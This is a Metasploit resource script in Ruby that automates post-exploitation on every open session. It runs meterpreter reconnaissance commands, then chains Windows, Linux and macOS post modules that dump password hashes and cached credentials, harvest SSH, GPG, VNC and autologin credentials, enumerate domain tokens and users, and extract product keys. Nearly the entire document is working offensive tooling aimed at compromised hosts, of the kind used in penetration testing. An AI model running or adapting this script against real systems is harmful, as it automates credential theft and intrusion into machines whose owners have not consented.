# multi_post.rb
# Author: m-1-k-3 (Web: http://www.s3cur1ty.de / Twitter: @s3cur1ty_de)

# This Metasploit RC-File could be used to automate the post-exploitation process
# VERBOSE is used from the global datastore
# check out the meterpreter_commands and the modules_win and modules_lin and modules_multi
# you could add your own post exploitation modules into them

<ruby>
#we look in the global datastore for a global VERBOSE option and use it
if (framework.datastore['VERBOSE'] == "true")
	verbose = 1 #true
else
	verbose = 0
end

meterpreter_commands = Array.new

if (framework.datastore['METER_AUTO_COM'] != nil)
	#we look in the global datastore for a global METER_AUTO_COM option and use it
	meterpreter_commands = framework.datastore['METER_AUTO_COM'].split(" ")
else
	meterpreter_commands = [
		'sysinfo',
		'getuid',
		'getpid',
		'ps',
		'ipconfig'
	]
end

if (framework.datastore['MOD_WIN'] != nil)
	#we look in the global datastore for a global METER_AUTO_COM option and use it
	modules_win = framework.datastore['MOD_WIN'].split(" ")
else
	modules_win = [
		'post/windows/gather/hashdump',
		'post/windows/gather/cachedump',
		'post/windows/gather/smart_hashdump',
		'post/windows/gather/enum_tokens',
		'post/windows/gather/enum_domain',
		'post/windows/gather/enum_domain_group_users',
		'post/windows/gather/enum_domain_tokens',
		'post/windows/gather/enum_hostfile',
		'post/windows/gather/enum_ie',
		'post/windows/gather/enum_logged_on_users',
		'post/windows/gather/enum_ms_product_keys',
		'post/windows/gather/credentials/vnc',
		'post/windows/gather/credentials/windows_autologin',
		'post/windows/gather/checkvm',
		'post/windows/gather/enum_applications',
		'post/windows/gather/enum_services',
		'post/windows/gather/enum_shares',
		'post/windows/gather/enum_snmp',
		'post/windows/gather/enum_devices',
		'post/windows/gather/enum_powershell_env'
	]	# add some more modules or comment some out ...
end

if (framework.datastore['MOD_LIN'] != nil)
	#we look in the global datastore for a global METER_AUTO_COM option and use it
	modules_lin = framework.datastore['MOD_LIN'].split(" ")
else
	modules_lin = [
		'post/linux/gather/hashdump',
		'post/osx/gather/hashdump',
		'post/linux/gather/enum_network',
		'post/linux/gather/enum_system',
		'post/linux/gather/enum_users_history',
		'post/linux/gather/checkvm',
		'post/osx/gather/enum_osx'
	]
end

if (framework.datastore['MOD_MULTI'] != nil)
	#we look in the global datastore for a global METER_AUTO_COM option and use it
	modules_multi = framework.datastore['MOD_MULTI'].split(" ")
else
	modules_multi = [
		'post/multi/gather/env',
		'post/multi/gather/gpg_creds',
		'post/multi/gather/ssh_creds'
	]
end

# lets start if we have a session
if (framework.sessions.length > 0)
	print_status("starting with post exploitation stuff")
	framework.sessions.each_key do |sid|
		session = framework.sessions[sid]
		#meterpreter commands against every meterpreter session
		if(session.type == "meterpreter")
			print_line("starting meterpreter commands on session number #{sid}")
			meterpreter_commands.each { |command|
				print_line("running meterpreter command #{command}")
				session.console.run_single("#{command.to_s}")
				print_line
			}
		end
	end

	print_status("starting the post exploitation with post exploitation modules")

	# lets start with post exploitation modules
	framework.sessions.each_key do |sid|
		session = framework.sessions[sid]
		ips = session.session_host
		print_status("Session ID: #{sid.to_i} - IP: #{ips}")

		# multi -> all sessions
		modules_multi.each { |modul|
				run_single("use #{modul}")
				run_single("set SESSION #{sid}")
				if (verbose == 1)
					run_single("run -j")
				else
					run_single("run -j -q")
				end
		}

		# windows sessions
		if(session.platform =~ /win/)
			modules_win.each { |modul|
				run_single("use #{modul}")
				run_single("set SESSION #{sid}")
				if (verbose == 1)
					run_single("run -j")
				else
					run_single("run -j -q")
				end
			}
		else
			# all other sessions -> typical some linux or unix based systems
			modules_lin.each { |modul|
				run_single("use #{modul}")
				run_single("set SESSION #{sid}")
				if (verbose == 1)
					run_single("run -j")
				else
					run_single("run -j -q")
				end
			}
		end
	end
else
	print_error("no sessions available")
end
run_single("back")
</ruby>
